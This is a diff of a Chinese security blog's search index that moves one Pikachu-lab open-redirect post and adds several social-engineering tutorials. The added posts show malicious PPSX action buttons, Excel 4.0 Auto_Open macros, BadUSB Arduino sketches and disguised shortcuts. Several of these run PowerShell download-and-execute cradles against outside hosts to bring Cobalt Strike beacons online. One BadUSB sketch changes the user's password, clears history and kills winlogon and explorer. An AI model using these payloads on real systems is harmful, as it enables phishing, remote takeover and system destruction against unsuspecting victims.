@@ -1366,6 +1366,28 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-不安全的URL跳转</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
+    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
+<p>点击最后一个参数</p>
+<p>获取url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
+
+<p>url指定重定向后的网页</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>重定向到百度</p>
+<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
+<p>可以抓个包看看</p>
+<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
+<p>可以看到302响应包中的location字段指向百度</p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-xss</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
     <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
@@ -1749,28 +1771,6 @@
 <p><img src="/images/image-20230109092702680.png" alt="image-20230109092702680"></p>
 <h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></p>
 </script></p>]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-不安全的URL跳转</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
-    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
-<p>点击最后一个参数</p>
-<p>获取url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
-
-<p>url指定重定向后的网页</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>重定向到百度</p>
-<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
-<p>可以抓个包看看</p>
-<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
-<p>可以看到302响应包中的location字段指向百度</p>
-]]></content>
       <categories>
         <category>pikachu靶场系列</category>
       </categories>
@@ -2393,12 +2393,377 @@
       </categories>
   </entry>
   <entry>
+    <title>PPT动作按钮特性构造PPSX钓鱼</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
+<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
+<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
+<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
+<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
+<p>该利用方式同时适用于wps</p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>badusb初探</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/badusb%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<p>这里以最像u盘的leonardo_Arduino为badusb载体</p>
+<h2 id="第一步：Arduino安装"><a href="#第一步：Arduino安装" class="headerlink" title="第一步：Arduino安装"></a>第一步：Arduino安装</h2><p>下载Arduino开发者工具——用来向leonardo烧录程序的软件。</p>
+<p><a href="https://www.arduino.cn/thread-5838-1-1.html">https://www.arduino.cn/thread-5838-1-1.html</a></p>
+<p>官网：<a href="https://www.arduino.cc/en/software">https://www.arduino.cc/en/software</a></p>
+<p>直接装就完事</p>
+<p><img src="/images/1662387479142-79620737-c97b-4e79-9090-c1e96b50d8bc.png"></p>
+<h5 id="更改中文"><a href="#更改中文" class="headerlink" title="更改中文"></a>更改中文</h5><p><img src="/images/2022-11-21-15-29-08-image.png"></p>
+<p><img src="/images/2022-11-21-15-29-31-image.png"></p>
+<h2 id="第二步：Arduino"><a href="#第二步：Arduino" class="headerlink" title="第二步：Arduino"></a>第二步：Arduino</h2><p>工具-开发板-开发板管理器</p>
+<p><img src="/images/1662388486461-4517cc69-4590-4cd6-8daf-2b8b2b8447ef.png"></p>
+<p>回到主界面</p>
+<h5 id="开发板选择"><a href="#开发板选择" class="headerlink" title="开发板选择"></a>开发板选择</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工具-开发板- Arduino Leonardo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1662388595312-822eba26-bb49-4ed6-be68-4518c6e3a0bc.png"></p>
+<h5 id="编程器选择"><a href="#编程器选择" class="headerlink" title="编程器选择"></a>编程器选择</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AVRISP mkII</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1662388708998-b4aa4a4f-cb07-4d68-915e-79be114dd11e.png"></p>
+<p><img src="/images/2022-11-21-15-32-16-image.png"></p>
+<h5 id="Automator"><a href="#Automator" class="headerlink" title="Automator"></a>Automator</h5><p>有个快速编写命令的工具：Automator</p>
+<p>下载地址：<a href="https://github.com/Catboy96/Automator">GitHub - Catboy96&#x2F;Automator: ⌨ Digispark™ Rubber Ducky code editor for Windows.</a></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>插上你的leonardo，点击左上角第二个箭头符号进行上传，等待个50几秒就成功了。</p>
+<p><img src="/images/1662389418313-ed825f05-2807-4772-acaa-90b036d64af3.png"></p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果没有自动选择需要手动选择自己的设备</p>
+<p><img src="/images/2022-11-21-15-47-18-image.png"></p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;//初始化</span><br><span class="line">  Keyboard.begin();//开始键盘通讯</span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">  Keyboard.release(&#x27;r&#x27;);</span><br><span class="line">  Keyboard.println(&quot;cmd.exe&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.println(&quot;calc&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.end();//结束键盘通讯CMD</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="powershell上线CS"><a href="#powershell上线CS" class="headerlink" title="powershell上线CS"></a>powershell上线CS</h2><p>首先生成一个cs powershell的上线马</p>
+<p><img src="/images/2022-11-21-15-38-10-image.png"></p>
+<p>将下述代码载入设备</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;//初始化</span><br><span class="line">  Keyboard.begin();//开始键盘通讯</span><br><span class="line">  delay(5000);</span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI);//win键，按下</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.press(&#x27;r&#x27;);//r键，按下</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.release(KEY_LEFT_GUI);//释放win</span><br><span class="line">  Keyboard.release(&#x27;r&#x27;);//释放r</span><br><span class="line">  Keyboard.println(&quot;cmd.exe&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.println(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12224/a&#x27;))\&quot;&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.end();//结束键盘通讯CMD</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="有关程序覆盖问题"><a href="#有关程序覆盖问题" class="headerlink" title="有关程序覆盖问题"></a>有关程序覆盖问题</h2><p>每次上传都会刷新</p>
+<p>擦除+刷写+校验。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12229/a&#x27;))\&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Arduino-Leonardo教程"><a href="#Arduino-Leonardo教程" class="headerlink" title="Arduino Leonardo教程"></a>Arduino Leonardo教程</h2><h5 id="和键盘有关的常用函数指引"><a href="#和键盘有关的常用函数指引" class="headerlink" title="和键盘有关的常用函数指引"></a><strong>和键盘有关的常用函数指引</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///首先是头文件</span><br><span class="line">#include &quot;Keyboard.h&quot;    </span><br><span class="line"></span><br><span class="line">///声明头文件后，就可以使用常用的函数，初始化键盘，这个我会放在setup()函数里面</span><br><span class="line">Keyboard.begin();</span><br><span class="line"></span><br><span class="line">///然后可以试着打印一段字符</span><br><span class="line">Keyboard.print(&quot;GG&quot;);//没有回车</span><br><span class="line">Keyboard.println(&#x27;\r&#x27;);//有回车</span><br><span class="line"></span><br><span class="line">///一些必要的函数，按下按键和释放按键</span><br><span class="line">Keyboard.press(KEY_BACKSPACE);</span><br><span class="line">Keyboard.release(KEY_BACKSPACE);</span><br></pre></td></tr></table></figure>
+
+<h5 id="特殊按键使用"><a href="#特殊按键使用" class="headerlink" title="特殊按键使用"></a>特殊按键使用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///Alt和Ctrl和Shift</span><br><span class="line">#define KEY_LEFT_CTRL   0x80</span><br><span class="line">#define KEY_LEFT_SHIFT    0x81</span><br><span class="line">#define KEY_LEFT_ALT    0x82</span><br><span class="line">#define KEY_LEFT_GUI    0x83</span><br><span class="line">#define KEY_RIGHT_CTRL    0x84</span><br><span class="line">#define KEY_RIGHT_SHIFT   0x85</span><br><span class="line">#define KEY_RIGHT_ALT   0x86</span><br><span class="line">#define KEY_RIGHT_GUI   0x87</span><br><span class="line">///方向键系列</span><br><span class="line">#define KEY_UP_ARROW    0xDA</span><br><span class="line">#define KEY_DOWN_ARROW    0xD9</span><br><span class="line">#define KEY_LEFT_ARROW    0xD8</span><br><span class="line">#define KEY_RIGHT_ARROW   0xD7</span><br><span class="line">//特殊键位，其中RETURN就是回车</span><br><span class="line">#define KEY_BACKSPACE   0xB2</span><br><span class="line">#define KEY_TAB       0xB3</span><br><span class="line">#define KEY_RETURN      0xB0</span><br><span class="line">#define KEY_ESC       0xB1</span><br><span class="line">///特殊键位，我比较常用的是DELETE</span><br><span class="line">#define KEY_INSERT      0xD1</span><br><span class="line">#define KEY_DELETE      0xD4</span><br><span class="line">#define KEY_PAGE_UP     0xD3</span><br><span class="line">#define KEY_PAGE_DOWN   0xD6</span><br><span class="line">#define KEY_HOME      0xD2</span><br><span class="line">#define KEY_END       0xD5</span><br><span class="line">#define KEY_CAPS_LOCK   0xC1</span><br><span class="line">///F区的这些那些</span><br><span class="line">#define KEY_F1        0xC2</span><br><span class="line">#define KEY_F2        0xC3</span><br><span class="line">#define KEY_F3        0xC4</span><br><span class="line">#define KEY_F4        0xC5</span><br><span class="line">#define KEY_F5        0xC6</span><br><span class="line">#define KEY_F6        0xC7</span><br><span class="line">#define KEY_F7        0xC8</span><br><span class="line">#define KEY_F8        0xC9</span><br><span class="line">#define KEY_F9        0xCA</span><br><span class="line">#define KEY_F10       0xCB</span><br><span class="line">#define KEY_F11       0xCC</span><br><span class="line">#define KEY_F12       0xCD</span><br><span class="line">#define KEY_F13       0xF0</span><br><span class="line">#define KEY_F14       0xF1</span><br><span class="line">#define KEY_F15       0xF2</span><br><span class="line">#define KEY_F16       0xF3</span><br><span class="line">#define KEY_F17       0xF4</span><br><span class="line">#define KEY_F18       0xF5</span><br><span class="line">#define KEY_F19       0xF6</span><br><span class="line">#define KEY_F20       0xF7</span><br><span class="line">#define KEY_F21       0xF8</span><br><span class="line">#define KEY_F22       0xF9</span><br><span class="line">#define KEY_F23       0xFA</span><br><span class="line">#define KEY_F24       0xFB</span><br></pre></td></tr></table></figure>
+
+<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;//初始化</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(5000);//延时</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK); //释放大写键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(&#x27;r&#x27;);</span><br><span class="line">Keyboard.println(&quot;cmd.exe&quot;);</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;CMD.EXE /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;NET USER %USERNAME% HACKED&quot;);//修改密码HACKED</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color a&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ........................................................ &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ### ###### ## ## ######## ######## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 0&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 1&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 2&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ######### ## ## ## ##### ###### ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 3&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ######### ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 4&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 5&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ###### ## ## ######## ######## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 6&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ........................................................ &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color c&quot;);//更改命令行颜色（红色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;cls&quot;);//更改命令行颜色（红色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;type hacked.txt&quot;);//将hacked.txt文件内容打印在cmd</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1&gt;NUL 2&gt;NUL&amp;TASKKILL /F /IM WININIT.EXE 2&gt;NUL&quot;);//蓝屏XP、7</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;taskkill /f /im explorer.exe&quot;);//删除桌面进程(all)</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.end();//结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="命令行颜色相关"><a href="#命令行颜色相关" class="headerlink" title="命令行颜色相关"></a>命令行颜色相关</h5><p><img src="/images/1662389741911-16d24671-1089-4391-8d80-37748a3c7d8f.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>excel钓鱼(office)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/excel%E9%92%93%E9%B1%BC(office)/</url>
+    <content><![CDATA[<h2 id="sheet右键插入"><a href="#sheet右键插入" class="headerlink" title="sheet右键插入"></a>sheet右键插入</h2><p><img src="/images/1665296484752-07145a2a-baec-47ef-ae19-78111d962d71.png"></p>
+<h2 id="选择宏表"><a href="#选择宏表" class="headerlink" title="选择宏表"></a>选择宏表</h2><p><img src="/images/1665296533204-07b5885a-e1a5-4d0c-99a5-905378375f41.png"></p>
+<p>会多出一栏宏</p>
+<p><img src="/images/1665296578713-88797dcc-316d-4eb1-9cdd-b3c75a89ccb9.png"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>分别在A1和A2输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=exec(&quot;c:\windows\system32\cmd.exe&quot;)</span><br><span class="line">=halt()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665296646193-cdded01b-6d69-4ba5-ad9e-42875fe1c19c.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并将A1改为Auto_Open</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665296823093-4782b636-fc03-4270-8bc7-9ebd052cb943.png"></p>
+<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p>可能会报如下错误</p>
+<p><img src="/images/1665297307090-b503ddfe-6d8e-486f-982d-24798e81a2df.png"></p>
+<h5 id="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"><a href="#单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件" class="headerlink" title="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"></a>单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件</h5><p><img src="/images/1665297404810-b7af1740-237e-4371-b314-27ae5e4a5b7e.png"></p>
+<h5 id="成功执行系统命令"><a href="#成功执行系统命令" class="headerlink" title="成功执行系统命令"></a>成功执行系统命令</h5><p><img src="/images/1665297687638-e8787e4b-3a56-4594-8007-e6ec0e6723ab.png"></p>
+<h5 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h5><p>可以右键将其隐藏</p>
+<p><img src="/images/1665298061106-30f698ba-0e2f-4d9c-b5cc-e994062fe3b0.png"></p>
+<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>将系统命令替换为CS上线脚本即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://114.55.173.106:12888/a&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>这里由于excel中公式对单双引号的解析问题，直接贴上去无法执行</p>
+<h5 id="生成exe马"><a href="#生成exe马" class="headerlink" title="生成exe马"></a>生成exe马</h5><p><img src="/images/1665303573348-87529184-2027-4f7a-8c70-ac53c45d5db8.png"></p>
+<p><img src="/images/1665303670194-7cfad13b-5cc5-4c9b-8126-23d0417eae75.png"></p>
+<h5 id="打开文档即上线"><a href="#打开文档即上线" class="headerlink" title="打开文档即上线"></a>打开文档即上线</h5><p><img src="/images/1665303691884-961166e4-dc60-498f-a834-0b8873a8a097.png"></p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>exe伪装(更换图标)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/exe%E4%BC%AA%E8%A3%85(%E6%9B%B4%E6%8D%A2%E5%9B%BE%E6%A0%87)/</url>
+    <content><![CDATA[<p>首先需要知道的是，快捷方式是可以通过右键属性更改图标的，而exe不行</p>
+<h2 id="制作ico"><a href="#制作ico" class="headerlink" title="制作ico"></a>制作ico</h2><p>在线网站</p>
+<p><a href="https://www.bitbug.net/">https://www.bitbug.net/</a></p>
+<h2 id="快捷方式更换ico"><a href="#快捷方式更换ico" class="headerlink" title="快捷方式更换ico"></a>快捷方式更换ico</h2><p>快捷方式优点就是方便，缺点就是只能ico必须在指定目录，否则就无了</p>
+<h5 id="右键属性"><a href="#右键属性" class="headerlink" title="右键属性"></a>右键属性</h5><p><img src="/images/1665320522065-1422452f-5d49-4d80-928d-46319d04988d.png"></p>
+<h5 id="可以选择系统中的图标"><a href="#可以选择系统中的图标" class="headerlink" title="可以选择系统中的图标"></a>可以选择系统中的图标</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\System32\SHELL32.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665320683988-a232a406-5cf9-496d-9b58-de4efe8451fd.png"></p>
+<h5 id="也可以使用自己的图标"><a href="#也可以使用自己的图标" class="headerlink" title="也可以使用自己的图标"></a>也可以使用自己的图标</h5><p><img src="/images/1665320664924-791e30e4-0557-4893-8377-c19c79627ac8.png"></p>
+<p><img src="/images/1665320717759-5e6c63d2-2ae0-4ad2-91b2-b14e96253a81.png"></p>
+<h5 id="exe更改图标"><a href="#exe更改图标" class="headerlink" title="exe更改图标"></a>exe更改图标</h5><p>exe并不能通过右键属性更改图标</p>
+<p>这里需要借助其他工具</p>
+<h2 id="resource-hacker"><a href="#resource-hacker" class="headerlink" title="resource_hacker"></a>resource_hacker</h2><p>缺点为只能为本来就存在图标的exe更换图标</p>
+<h5 id="如图"><a href="#如图" class="headerlink" title="如图"></a>如图</h5><p><img src="/images/1665324741918-6de777c4-84ae-4ad8-a5b6-366fe2b41eea.png"></p>
+<p><img src="/images/1665324804951-d5b206fd-2aad-48dd-80e7-19f5c5eb0cad.png"></p>
+<p><img src="/images/1665325306073-d6550a39-c531-47a9-a9d7-1944c80e0abb.png"></p>
+<h5 id="还可以使用其他exe的图标，直接选择exe就行"><a href="#还可以使用其他exe的图标，直接选择exe就行" class="headerlink" title="还可以使用其他exe的图标，直接选择exe就行"></a>还可以使用其他exe的图标，直接选择exe就行</h5><p><img src="/images/1665325386986-ccfd9dc2-b4db-4567-b21f-83252240aff4.png"></p>
+<h5 id="成功替换"><a href="#成功替换" class="headerlink" title="成功替换"></a>成功替换</h5><p>建议在保存的时候选择另存为，存到其他路径，好像是有缓存，可以重启或直接放到其他主机或目录</p>
+<p><img src="/images/1665325757284-8a24e229-02ef-44c3-85ac-ff2b93ad9e75.png"></p>
+<h2 id="QIcon"><a href="#QIcon" class="headerlink" title="QIcon"></a>QIcon</h2><p><img src="/images/1665325612042-34c924ec-7182-4bd8-91fc-a173c5607fe2.png"></p>
+<h5 id="拖入点apply即可"><a href="#拖入点apply即可" class="headerlink" title="拖入点apply即可"></a>拖入点apply即可</h5><p><img src="/images/1665326051647-51888795-9b82-4673-8529-a68f954b9781.png"></p>
+<p>可用于更改自解压钓鱼exe的图标</p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
     <title>postfix查看日志</title>
     <url>/2023/05/11/%E7%A4%BE%E5%B7%A5/postfix%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97/</url>
     <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -u postfix.service</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/image-20230323160437589.png" alt="image-20230323160437589"></p>
 <p><img src="/images/image-20230323160449799.png" alt="image-20230323160449799"></p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>powershell快捷方式钓鱼</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/powershell%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<p>和Link链接钓鱼类似</p>
+<h2 id="创建快捷方式"><a href="#创建快捷方式" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12888/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>由于不需要调用其他文件，起始位置为空就行</p>
+<p><img src="/images/1665284276884-34396d69-4a97-4ff7-bc81-b8ffec3560ab.png"></p>
+<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>双击即上线</p>
+<p><img src="/images/1665284355445-6a77551a-0703-4ea6-bb36-e532c6b91daa.png"></p>
+<h2 id="更改快捷方式图标"><a href="#更改快捷方式图标" class="headerlink" title="更改快捷方式图标"></a>更改快捷方式图标</h2><p>将其更改为python的图标</p>
+<p><img src="/images/1665284566707-3f2a8b68-c382-43a6-8eb5-02bf162cc01d.png"></p>
+<p><img src="/images/1665284666346-c55d3bc4-cb01-47e1-8b32-a5cf2cc5ede9.png"></p>
+<p><img src="/images/1665284606595-63a5222b-3c54-4a41-a58d-694ab167a1b7.png"></p>
+<p>同样双击即上线</p>
+<p><img src="/images/1665303934572-30220743-0688-478c-9395-1de47a0e41ed.png"></p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
